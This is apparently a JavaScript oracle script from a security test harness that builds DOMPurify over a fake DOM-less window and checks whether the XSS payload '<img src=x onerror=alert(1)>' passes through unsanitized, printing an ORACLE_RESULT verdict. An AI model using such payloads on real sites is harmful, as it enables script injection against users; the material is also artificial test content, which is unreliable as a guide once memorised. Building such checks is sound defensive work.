(function () {
  var operation_completed = false;
  var exploit_succeeded = false;
  var evidence = '';

  try {
    var createDOMPurify = require('dompurify');

    if (typeof createDOMPurify !== 'function') {
      throw new Error('dompurify export is not a function');
    }

    var fakeDocument = {
      nodeType: 9,
      implementation: {
        createHTMLDocument: function () {
          return {
            documentElement: { nodeName: 'HTML' },
            body: { nodeName: 'BODY' }
          };
        },
        createDocument: function () {
          return {
            documentElement: { nodeName: 'HTML' },
            body: { nodeName: 'BODY' }
          };
        }
      }
    };

    var fakeWindow = {
      document: fakeDocument
    };

    var DOMPurify = createDOMPurify(fakeWindow);
    if (!DOMPurify || typeof DOMPurify.sanitize !== 'function') {
      throw new Error('sanitize API unavailable');
    }

    var benign = '<p>hello</p>';
    var benignOut = DOMPurify.sanitize(benign);
    if (typeof benignOut !== 'string' || benignOut !== benign) {
      throw new Error('benign sanitize did not return expected string');
    }

    operation_completed = true;

    var payload = '<img src=x onerror=alert(1)>';
    var maliciousOut = DOMPurify.sanitize(payload);

    exploit_succeeded = typeof maliciousOut === 'string' && maliciousOut === payload;
    evidence = 'supportsDOM=' + (DOMPurify.isSupported === true) + ';benignOut=' + JSON.stringify(benignOut) + ';maliciousOut=' + JSON.stringify(maliciousOut);
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'exception:' + (e && e.message ? e.message : String(e));
  }

  console.log('ORACLE_RESULT ' + JSON.stringify({
    operation_completed: operation_completed,
    exploit_succeeded: exploit_succeeded,
    evidence: evidence
  }));
})();